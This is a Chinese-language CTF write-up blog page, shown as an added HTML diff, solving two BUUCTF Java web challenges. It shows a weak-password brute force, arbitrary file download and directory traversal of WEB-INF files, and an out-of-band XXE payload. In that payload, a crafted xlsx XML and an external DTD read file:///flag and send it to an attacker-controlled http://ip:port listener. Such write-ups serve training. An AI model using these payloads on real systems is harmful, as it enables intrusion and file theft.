@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - buu一道简单java web</title>
+        <meta name="description" content="[RoarCTF 2019]Easy Java buu平台一道简单java web[RoarCTF 2019]Easy Java 打开题目，一个登录页面，可以bp爆破出弱密码admin/admin888 登录页没什么内容 尝试首页的help，路由像是存在任意文件下载漏洞，没有下载help.docx文件，换成post请求…">
+    <link rel="canonical" href="https://the0n3.top/pages/24d392/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="buu一道简单java web">
+    <meta property="og:description" content="[RoarCTF 2019]Easy Java buu平台一道简单java web[RoarCTF 2019]Easy Java 打开题目，一个登录页面，可以bp爆破出弱密码admin/admin888 登录页没什么内容 尝试首页的help，路由像是存在任意文件下载漏洞，没有下载help.docx文件，换成post请求…">
+    <meta property="og:url" content="https://the0n3.top/pages/24d392/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/buujava/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="buu一道简单java web">
+    <meta name="twitter:description" content="[RoarCTF 2019]Easy Java buu平台一道简单java web[RoarCTF 2019]Easy Java 打开题目，一个登录页面，可以bp爆破出弱密码admin/admin888 登录页没什么内容 尝试首页的help，路由像是存在任意文件下载漏洞，没有下载help.docx文件，换成post请求…">
+        <meta name="twitter:image" content="https://the0n3.top/images/buujava/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <main class="markdown-body">
+            
+<article class="post-content">
+    <h1>buu一道简单java web</h1>
+    <p>
+        <span class="meta">发布于: 2024-10-09 19:14</span>
+    </p>
+    <div class="post-body">
+        <h2>[RoarCTF 2019]Easy Java</h2>
+<p>buu平台一道简单java web<a href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">[RoarCTF 2019]Easy Java</a></p>
+<p><img src="/images/buujava/1.png" alt="1" decoding="async" width="569" height="423"></p>
+<p>打开题目，一个登录页面，可以bp爆破出弱密码<code>admin/admin888</code></p>
+<p><img src="/images/buujava/2.png" alt="2" decoding="async" loading="lazy" width="1618" height="408"></p>
+<p>登录页没什么内容</p>
+<p><img src="/images/buujava/3.png" alt="3" decoding="async" loading="lazy" width="1159" height="707"></p>
+<p>尝试首页的<code>help</code>，路由像是存在任意文件下载漏洞，没有下载<code>help.docx</code>文件，换成post请求才能下载文件，这是什么题目，这也是play的一环吗</p>
+<p>post发送请求<code>filename=help.docx</code>，下载<code>help.docx</code>文件，没用</p>
+<p>关于<code>WEB-INF</code>目录</p>
+<pre><code class="language-plaintext"> WEB-INF主要包含一下文件或目录： 
+/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 
+/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 
+/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 
+/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 
+/WEB-INF/database.properties：数据库配置文件</code></pre>
+<p>下载<code>/WEB-INF/web.xml</code>文件，看看服务配置项，里面记录了FLAG的controller</p>
+<p><img src="/images/buujava/5.png" alt="5" decoding="async" loading="lazy" width="1599" height="685"></p>
+<p>所以可以找<code>/WEB-INF/classes/com/wm/ctf/FlagController.class</code>，下载class文件，用<a href="https://java-decompiler.github.io/">jd-gui下载</a>反编译</p>
+<p><img src="/images/buujava/6.png" alt="6" decoding="async" loading="lazy" width="1598" height="789"></p>
+<p>flag base64编码了，解码拿到flag</p>
+<h2>[网鼎杯 2020 青龙组]filejava</h2>
+<p>上传文件后，可以下载，下载功能存在目录穿越漏洞</p>
+<p><img src="/images/buujava/7.png" alt="7" decoding="async" loading="lazy" width="745" height="276"></p>
+<p><img src="/images/buujava/8.png" alt="8" decoding="async" loading="lazy" width="1797" height="474"></p>
+<p>穿越下载java web的配置文件web.xml</p>
+<p><img src="/images/buujava/9.png" alt="9" decoding="async" loading="lazy" width="861" height="661"></p>
+<p>下载实现主要功能的class文件<code>DownloadServlet.class</code>,<code>ListFileServlet.class</code>,<code>UploadServlet.class</code></p>
+<p>在java web中，这些文件在<code>/WEB-INF/classes</code>目录下的自定义package下，也就是这里的<code>/cn/abc/servlet</code>下</p>
+<p><code>url/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</code>下载class文件</p>
+<p><code>jd-gui</code>反编译class文件，审计源码</p>
+<p>审计<code>DownloadServlet.class</code>，可以看到存在<code>flag</code>时会禁止下载</p>
+<p><img src="/images/buujava/10.png" alt="10" decoding="async" loading="lazy" width="1322" height="642"></p>
+<p>审计<code>ListFileServlet.class</code>，没有什么可以利用的</p>
+<p><img src="/images/buujava/11.png" alt="11" decoding="async" loading="lazy" width="1283" height="470"></p>
+<p>审计<code>UploadServlet.class</code>，如果上传的文件名是<code>excel-</code>开头，<code>.xlsx</code>结尾，那么会尝试读取文件的xml文件。doc， xlsx等文件实质是zip压缩包，里面存在一个xml文件，可以创建一个正常的excel文件，改扩展名为zip，把里面内容替换为恶意xml内容，再压缩，改回xlsx扩展名，上传。打一个xxe漏洞</p>
+<p><img src="/images/buujava/12.png" alt="12" decoding="async" loading="lazy" width="990" height="629"></p>
+<pre><code class="language-java">if (filename.startsWith("excel-") &amp;&amp; "xlsx".equals(fileExtName))
+          try {
+            // 读取xml文件，引用vps的dtd文件，利用xxe漏洞读取flag
+            Workbook wb1 = WorkbookFactory.create(in);
+            Sheet sheet = wb1.getSheetAt(0);
+            System.out.println(sheet.getFirstRowNum());
+          } catch (InvalidFormatException e) {
+            System.err.println("poi-ooxml-3.10 has something wrong");
+            e.printStackTrace();
+          }</code></pre>
+<p>这是创建的excel文件修改为zip文件里的xml文件内容，写好后再全部压缩到一个包里，扩展名改回<code>xlsx</code>，文件名<code>excel-1.xlsx</code></p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
+&lt;!DOCTYPE data SYSTEM "http://ip:port/1.dtd"&gt;
+&lt;data&gt;&amp;send;&lt;/data&gt;
+&lt;Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"&gt;&lt;Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/&gt;&lt;Default Extension="xml" ContentType="application/xml"/&gt;&lt;Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/&gt;&lt;Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/&gt;&lt;Override PartName="/xl/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/&gt;&lt;Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/&gt;&lt;Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/&gt;&lt;Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/&gt;&lt;/Types&gt;</code></pre>
+<p>vps进入一个空目录，新建1.dtd文件，内容为</p>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///flag"&gt;
+&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://ip:port/?%file;'&gt;"&gt;
+%all;</code></pre>
+<p>开启一个web服务，端口要和上面xml，dtd的端口一致</p>
+<pre><code class="language-bash">python3 -m http.server 4444</code></pre>
+<p>上传文件，可以在日志看到目标主机带着flag的访问</p>
+<p><img src="/images/buujava/14.png" alt="14" decoding="async" loading="lazy" width="737" height="240"></p>
+<p><img src="/images/buujava/13.png" alt="13" decoding="async" loading="lazy" width="1355" height="354"></p>
+<p>参考：</p>
+<ul>
+<li><a href="https://blog.csdn.net/mochu7777777/article/details/109572179">BUUCTF：[RoarCTF 2019]Easy Java</a></li>
+<li><a href="https://hksanduo.github.io/2021/06/22/2021-06-22-java-decompiler-tools/#">常见java反编译工具 _</a></li>
+<li><a href="https://www.cnblogs.com/W4nder/p/12866365.html">网鼎杯2020青龙组 web writeup </a></li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>wp</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#java</span>
+                                    <span>#ctf</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+        </main>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
